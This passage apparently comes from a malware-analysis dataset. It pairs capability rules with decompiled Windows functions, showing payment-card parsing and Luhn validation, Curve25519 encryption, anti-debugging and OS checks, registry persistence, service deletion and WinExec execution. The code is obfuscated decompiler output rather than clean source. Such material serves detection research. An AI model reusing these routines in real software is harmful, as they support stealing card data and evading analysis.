0x26);\n    iVar2 = fcn.00404580(0x407014, 0xd, 0x424508, 8);\n    bVar4 = iVar2 + -0x6e32 < 0;\n    uVar9 = 0x1d;\n    uVar11 = 0x1c;\n    uVar10 = 0x40;\n    uVar12 = 0;\n    fcn.00404580(0x407014, 0xd, 0x424510, 0x19);\n    if ((bVar4) || (!bVar4)) {\n        uVar9 = 0xb;\n        uVar11 = 0;\n        uVar10 = 0;\n        uVar12 = 0;\n        uVar8 = 0;\n        uVar5 = 0xd00;\n        Var7 = 0x42452c;\n        uVar6 = 0;\n    }\n    puVar1 = extraout_EDX + 0xe;\n    uVar3 = CARRY1(*puVar1, extraout_CH);\n    *puVar1 = *puVar1 + extraout_CH;\n    fcn.00404580(0x407014, CONCAT13(uVar6, uVar5 >> 8), CONCAT13(uVar8, Var7), \n                 CONCAT13(uVar12, CONCAT12(uVar10, CONCAT11(uVar11, uVar9))));\n    uVar5 = CONCAT31(0x401c5b, in_stack_ffffffbf);\n    fcn.00404580(0x407014, 0xd, 0x424538, 0x12);\n    if ((uVar3) || (!uVar3)) {\n        uVar5 = 0x1200;\n        in_stack_ffffffb7 = in_stack_ffffffb7 & 0xff | 0xd00;\n        in_stack_ffffffbb = 0x42454c00;\n    }\n    *(extraout_EDX_00 + 0xe) = *(extraout_EDX_00 + 0xe) + extraout_CH_00;\n    fcn.00404580(0x407014, in_stack_ffffffb7, in_stack_ffffffbb, uVar5);\n    fcn.00404580(0x407014, 0xd, 0x424560, 2);\n    ptr = 0x424564;\n    uVar5 = 0xd;\n    fcn.00404580(0x407014, 0xd, 0x424564, 8);\n    bVar4 = (unaff_BP + 0x6a77U & extraout_CX) < 0;\n    uVar6 = 0xe1;\n    uVar8 = 0x1c;\n    uVar9 = 0x40;\n    uVar11 = 0;\n    fcn.00404580(0x407014, 0xd, 0x42456c, 8);\n    if ((bVar4) || (!bVar4)) {\n        uVar6 = 6;\n        uVar8 = 0;\n        uVar9 = 0;\n        uVar11 = 0;\n        ptr = 0x424574;\n        uVar5 = 0xd;\n    }\n    *(extraout_EDX_01 + 0xe) = *(extraout_EDX_01 + 0xe) + extraout_CH_01;\n    fcn.00404580(0x407014, uVar5, ptr, CONCAT13(uVar11, CONCAT12(uVar9, CONCAT11(uVar8, uVar6))));\n    fcn.00404580(0x407014, 0xd, 0x42457c, 7);\n    fcn.00404580(0x407014, 0xd, 0x424584, 7);\n    fcn.00404580(0x407014, 0xd, 0x42458c, 6);\n    fcn.00404580(0x407014, 0xd, 0x424594, 0x25);\n    fcn.00404580(0x407014, 0xd, 0x4245bc, 8);\n    return;\n}\n",
        "token_count": 1245
    },
    "00402f10": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402fba) overlaps instruction at (ram,0x00402fb9)\n// \n\nuint __cdecl fcn.00402f10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    uint8_t uVar4;\n    uint32_t unaff_EBX;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    uVar6 = (unaff_EBX >> 8 & 0xffff00) << 8;\n    puVar5 = uVar6 & 0xffffff | unaff_EBX & 0xffff | uVar6 & 0xff000000;\n    var_4h = fcn.00402470(arg_18h, arg_1ch, 0x424188, 7);\n    if (var_4h == NULL) {\n        return 0;\n    }\n    if ((var_4h < 0) || (iVar3 = extraout_ECX,  var_4h >= 0)) {\n        iVar3 = 7;\n    }\n    *puVar5 = *puVar5 & 0xc3;\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    var_24h = 0;\n    puVar7 = &var_23h;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uVar6 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_24h)[uVar6] = uVar2;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0x20);\n    while( true ) {\n        puVar7 = &var_24h;\n        puVar8 = var_4h;\n        for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        cVar11 = '\\0';\n        uVar4 = puVar5 + 1U ^ 0x50;\n        cVar10 = uVar4 < '\\0';\n        bVar9 = uVar4 == 0;\n        puVar5 = puVar5 & 0xffff;\n        fcn.00402af0(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n        if ((bVar9 || cVar11 != cVar10) || (!bVar9 && cVar11 == cVar10)) break;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(extraout_EDX + -0x2b) = *(extraout_EDX + -0x2b) & extraout_EDX >> 8;\n    }\n    fcn.00402150(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 856
    },
    "00402670": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026b7) overlaps instruction at (ram,0x004026b2)\n// \n\nbool fcn.00402670(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    char *pcVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint uStack24;\n    int32_t iStack8;\n    \n    iStack8 = 0;\n    uVar9 = fcn.00402710(&iStack8);\n    bVar8 = (POPCOUNT(uVar9 & 0xff) & 1U) != 0;\n    if (uVar9 == 0) {\n        return false;\n    }\n    iVar2 = iStack8;\n    puVar5 = &stack0xfffffffc;\n    if ((bVar8) && (puVar5 = &stack0xfffffffc,  !bVar8)) {\n        iVar2 = (uVar9 >> 0x20) + 1;\n        puVar5 = *0x8b17b43a + 1;\n    }\n    bVar8 = iVar2 == 0;\n    if (bVar8) {\n        return false;\n    }\n    puVar6 = puVar5;\n    if ((!bVar8) && (bVar8)) {\n        puVar4 = &stack0xffffffec;\n        puVar6 = &stack0xffffffec;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = puVar6[-1];\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x42430c, 0x42434c, 1, puVar6[-1], ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 552
    },
    "00403b30": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00403b30(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x424594, 0x4245bc, &var_8h, &var_10ch, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(0xf0, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(0xf0);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 332
    },
    "00402df0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e4b) overlaps instruction at (ram,0x00402e4a)\n// \n// WARNING: Removing unreachable block (ram,0x00402e17)\n\nuint __cdecl fcn.00402df0(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uint8_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint8_t uVar5;\n    uint unaff_EBX;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar6;\n    uchar in_CF;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    unkbyte6 Var7;\n    \n    ppuVar6 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        ppuVar6 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n        uVar5 = unaff_EBX >> 8;\n        in_CF = uVar5 < *in_EAX;\n        in_OF = SBORROW1(uVar5, *in_EAX);\n        in_ZF = uVar5 == *in_EAX;\n    }\n    Var7 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar4 = Var7;\n    if ((!in_OF) && (in_OF)) {\n        arg_8h = ppuVar6 + 1;\n        uVar1 = in(Var7 >> 0x20);\n        *ppuVar6 = uVar1;\n        if (!in_CF && !in_ZF) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(extraout_ECX, uVar4);\n            if (iVar3 != 0) {\n                uVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar3);\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n                return uVar4;\n            }\n            return 0;\n        }\n    }\n    fcn.00402e90(uVar4, 0x56);\n    uVar2 = fcn.00402d00(uVar4, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 558
    },
    "00403940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403940(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402cb0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00405060();\n        arg_ch_01 = fcn.00405060();\n        arg_ch_02 = fcn.00405060();\n        fcn.00403aa0(arg_10h, arg_ch_00);\n        fcn.00403aa0(arg_8h, arg_ch_01);\n        fcn.00403aa0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x424158, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401000(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x424164, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401000(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x424164, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401000(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403aa0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 613
    },
    "00404a70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404a70(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42460c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403aa0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x424418, acStack1304, &uStack2112);\n    uStack2088 = 0x4244a0;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4244b8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    iVar2 = -1;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404610(auStack1564, 0x424414);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1847
    },
    "00401800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b47) overlaps instruction at (ram,0x00401b45)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401825)\n\nvoid fcn.00401800(void)\n\n{\n    char *pcVar1;\n    uint8_t extraout_AH;\n    char extraout_AH_00;\n    uint in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char cVar4;\n    char extraout_CH;\n    uint32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint16_t uVar5;\n    int32_t unaff_EBX;\n    uint uVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint unaff_EBP;\n    uint uVar12;\n    uint32_t unaff_ESI;\n    uint uVar13;\n    uint *unaff_EDI;\n    uint uVar14;\n    bool bVar15;\n    uchar uVar16;\n    char in_SF;\n    char cVar17;\n    uchar uVar18;\n    char in_OF;\n    char cVar19;\n    ulong uVar20;\n    ulong uVar21;\n    unkbyte6 Var22;\n    uint uStackY52;\n    uint uStackY48;\n    uint32_t uStackY44;\n    \n    puVar9 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar9 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    uStackY44 = 0x401837;\n    uVar2 = fcn.00404580(0x407014, 0xd, 0x424144, 0x11);\n    cVar19 = '\\0';\n    cVar17 = (unaff_ESI & (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + '\\x01', uVar2))) < 0;\n    uStackY44 = 0x401858;\n    uVar20 = fcn.00404580(0x407014, 0xd, 0x424360, 0xf);\n    uVar2 = extraout_ECX;\n    if (cVar19 == cVar17) {\n        uStackY44 = uStackY44 & 0xffff | extraout_ECX << 0x10;\n        uVar2 = extraout_ECX & 0xffff;\n        cVar4 = (extraout_ECX << 0x10) >> 0x18;\n        if (cVar19 != cVar17) goto code_r0x0040186a;\n    }\n    cVar4 = uVar2 >> 8;\n    uStackY44 = 0x1a;\n    uStackY48 = 0x424370;\n    uStackY52 = 0xd;\ncode_r0x0040186a:\n    puVar8 = &stack0xffffffcc ^ *(unaff_EBX + 0x6a);\n    pcVar1 = (uVar20 >> 0x20) + 0xe;\n    *pcVar1 = *pcVar1 + (cVar4 - *(unaff_ESI + 0x70));\n    puVar8[-1] = 0x407014;\n    puVar8[-2] = 0x401880;\n    fcn.00404580(puVar8[-1], *puVar8, puVar8[1], puVar8[2]);\n    puVar8[6] = unaff_EBX + 1;\n    uVar6 = puVar8[6];\n    puVar8[6] = 10;\n    puVar8[5] = 0x4243c4;\n    puVar8[4] = 0xd;\n    puVar8[3] = 0x407014;\n    puVar8[2] = 0x4018a1;\n    uVar21 = fcn.00404580(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    puVar8[6] = uVar21;\n    puVar8[5] = extraout_ECX_00;\n    puVar8[4] = uVar21 >> 0x20;\n    puVar8[3] = uVar6;\n    puVar8[2] = puVar8 + 7;\n    puVar8[1] = unaff_EBP;\n    *puVar8 = uVar20;\n    puVar8[-1] = puVar9;\n    uVar14 = puVar8[-1];\n    uVar13 = *puVar8;\n    uVar12 = puVar8[1];\n    uVar2 = puVar8[3];\n    puVar8[6] = 0xb;\n    puVar8[5] = 0x4243d0;\n    puVar8[4] = 0xd;\n    puVar8[3] = 0x407014;\n    puVar8[2] = 0x4018c6;\n    Var22 = fcn.00404580(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    puVar8[6] = Var22;\n    *(puVar8 + 0x16) = Var22 >> 0x20;\n    puVar8[6] = 8;\n    puVar8[5] = 0x4243dc;\n    puVar8[4] = 0xd;\n    puVar8[3] = 0x407014;\n    puVar8[2] = 0x4018f9;\n    uVar6 = fcn.00404580(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    puVar8[6] = uVar6;\n    *(puVar8 + 0x16) = uVar2;\n    uVar5 = *(puVar8 + 0x16);\n    puVar8[6] = 9;\n    puVar8[5] = 0x4243e4;\n    puVar8[4] = 0xd;\n    puVar8[3] = 0x407014;\n    puVar8[2] = 0x401927;\n    uVar20 = fcn.00404580(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    bVar15 = 0xffffffef < puVar8 + 3;\n    uVar16 = puVar8 == 0xffffffe4;\n    puVar8[6] = uVar20;\n    puVar8[5] = extraout_ECX_01;\n    puVar8[4] = uVar20 >> 0x20;\n    puVar8[3] = (uVar2 >> 8 & 0xffff00) << 8 | uVar5;\n    puVar8[2] = puVar8 + 7;\n    puVar8[1] = uVar12;\n    *puVar8 = uVar13;\n    puVar8[-1] = uVar14;\n    uVar14 = puVar8[-1];\n    uVar13 = *puVar8;\n    uVar12 = puVar8[1];\n    puVar7 = puVar8[3];\n    puVar8[6] = 9;\n    puVar8[5] = 0x4243f0;\n    puVar8[4] = 0xd;\n    puVar8[3] = 0x407014;\n    puVar8[2] = 0x401945;\n    uVar6 = fcn.00404580(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    if (!bVar15) {\n        puVar8[2] = uVar13;\n        uVar13 = puVar8[2];\n        if (bVar15) {\n            out(0xbd, uVar6);\n            return;\n        }\n    }\n    puVar8[2] = 9;\n    puVar8[1] = 0x4243fc;\n    *puVar8 = 0xd;\n    puVar8[-1] = 0x407014;\n    puVar8[-2] = 0x401976;\n    uVar6 = fcn.00404580(puVar8[-1], *puVar8, puVar8[1], puVar8[2]);\n    puVar9 = puVar8 + -1;\n    if ((!bVar15 && !uVar16) && (puVar8[-2] = uVar6,  puVar9 = puVar8 + -1,  bVar15 || uVar16)) {\n        uVar13 = puVar8[-1];\n        puVar9 = puVar8 + -1;\n    }\n    puVar9[-1] = 0xc;\n    puVar9[-2] = 0x424408;\n    puVar9[-3] = 0xd;\n    puVar9[-4] = 0x407014;\n    puVar9[-5] = 0x4019a0;\n    uVar20 = fcn.00404580(puVar9[-4], puVar9[-3], puVar9[-2], puVar9[-1]);\n    puVar9[7] = uVar20;\n    puVar9[6] = uVar20 >> 0x20;\n    puVar9[7] = 3;\n    puVar9[6] = 0x424414;\n    puVar9[5] = 0xd;\n    puVar9[4] = 0x407014;\n    puVar9[3] = 0x4019d2;\n    fcn.00404580(puVar9[4], puVar9[5], puVar9[6], puVar9[7]);\n    puVar9[3] = 10;\n    puVar9[2] = 0x424418;\n    puVar9[1] = 0xd;\n    *puVar9 = 0x407014;\n    puVar9[-1] = 0x4019f3;\n    fcn.00404580(*puVar9, puVar9[1], puVar9[2], puVar9[3]);\n    puVar9[7] = extraout_ECX_02;\n    puVar9[6] = extraout_EDX;\n    uVar16 = 0;\n    uVar18 = (extraout_EDX ^ puVar7 >> 8 | 0x67) < '\\0';\n    puVar9[7] = 0x40;\n    puVar9[6] = 0x424424;\n    puVar9[5] = 0xd;\n    puVar9[4] = 0x407014;\n    puVar9[3] = 0x401a18;\n    fcn.00404580(puVar9[4], puVar9[5], puVar9[6], puVar9[7]);\n    puVar9[3] = 0xc;\n    puVar9[2] = 0x424464;\n    puVar9[1] = 0xd;\n    *puVar9 = 0x407014;\n    puVar9[-1] = 0x401a3d;\n    uVar6 = fcn.00404580(*puVar9, puVar9[1], puVar9[2], puVar9[3]);\n    if ((!uVar16) && (puVar9[-1] = uVar13,  uVar16)) {\n        out(0xbd, uVar6);\n        return;\n    }\n    puVar9[-1] = 0xb;\n    puVar9[-2] = 0x424470;\n    puVar9[-3] = 0xd;\n    puVar10 = puVar9 + -4;\n    puVar9[-4] = 0x407014;\n    puVar9[-5] = 0x401a6e;\n    iVar3 = fcn.00404580(puVar9[-4], puVar9[-3], puVar9[-2], puVar9[-1]);\n    if ((uVar18) || (!uVar18)) {\n        puVar10 = puVar9 + -5;\n        puVar9[-5] = 4;\n    }\n    *puVar7 = *puVar7 & 0xc3;\n    puVar10[-1] = 0x42447c;\n    puVar10[-2] = 0xd;\n    puVar10[-3] = 0x407014;\n    puVar10[-4] = 0x401a91;\n    fcn.00404580(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n    *(puVar10 + 0x32) = puVar7;\n    *(puVar10 + 0x2e) = extraout_EDX_00;\n    *(puVar10 + 0x2a) = uVar14;\n    uVar6 = *(puVar10 + 0x2a);\n    uVar5 = *(puVar10 + 0x32);\n    puVar10[0xc] = 4;\n    puVar10[0xb] = 0x424480;\n    puVar10[10] = 0xd;\n    puVar10[9] = 0x407014;\n    puVar10[8] = 0x401ab4;\n    uVar20 = fcn.00404580(puVar10[9], puVar10[10], puVar10[0xb], puVar10[0xc]);\n    puVar10[0xc] = uVar20;\n    puVar10[0xb] = extraout_ECX_03;\n    puVar10[10] = uVar20 >> 0x20;\n    puVar10[9] = puVar7 & 0xffff0000 | uVar5;\n    puVar10[8] = puVar10 + 0xd;\n    puVar10[7] = uVar12;\n    puVar10[6] = iVar3 + -0x1bf31dd6;\n    puVar10[5] = uVar6;\n    uVar12 = puVar10[6];\n    uVar6 = puVar10[9];\n    puVar10[0xc] = 0xc;\n    puVar10[0xb] = 0x424484;\n    puVar10[10] = 0xd;\n    puVar10[9] = 0x407014;\n    puVar10[8] = 0x401ad1;\n    fcn.00404580(puVar10[9], puVar10[10], puVar10[0xb], puVar10[0xc]);\n    puVar10[0xc] = uVar6;\n    puVar10[0xb] = extraout_ECX_04;\n    cVar19 = '\\0';\n    cVar17 = '\\0';\n    bVar15 = ((uVar6 & 0xff00 | uVar6 | extraout_AH) & 0x94f) == 0;\n    uVar6 = puVar10[0xc];\n    puVar10[0xc] = 4;\n    puVar10[0xb] = 0x424490;\n    puVar10[10] = 0xd;\n    puVar10[9] = 0x407014;\n    puVar10[8] = 0x401afd;\n    fcn.00404580(puVar10[9], puVar10[10], puVar10[0xb], puVar10[0xc]);\n    if (!bVar15 && cVar19 == cVar17) {\n        *(puVar10 + 0x22) = uVar12;\n    }\n    puVar10[8] = 9;\n    puVar10[7] = 0x424494;\n    puVar10[6] = 0xd;\n    puVar10[5] = 0x407014;\n    puVar10[4] = 0x401b1c;\n    fcn.00404580(puVar10[5], puVar10[6], puVar10[7], puVar10[8]);\n    puVar10[0xc] = extraout_EDX_01;\n    cVar17 = extraout_EDX_01 + '\\x15';\n    cVar19 = SBORROW1(cVar17, extraout_AH_00);\n    cVar17 = cVar17 - extraout_AH_00 < '\\0';\n    puVar10[0xc] = 0x16;\n    puVar10[0xb] = 0x4244a0;\n    puVar10[10] = 0xd;\n    puVar11 = puVar10 + 9;\n    puVar10[9] = 0x407014;\n    puVar10[8] = 0x401b3c;\n    iVar3 = fcn.00404580(puVar10[9], puVar10[10], puVar10[0xb], puVar10[0xc]);\n    if ((cVar19 != cVar17) || (puVar10[8] = uVar6,  cVar19 == cVar17)) {\n        puVar10[8] = 7;\n        puVar10[7] = 0x4244b8;\n        puVar11 = puVar10 + 6;\n        puVar10[6] = 0xd;\n    }\n    *(iVar3 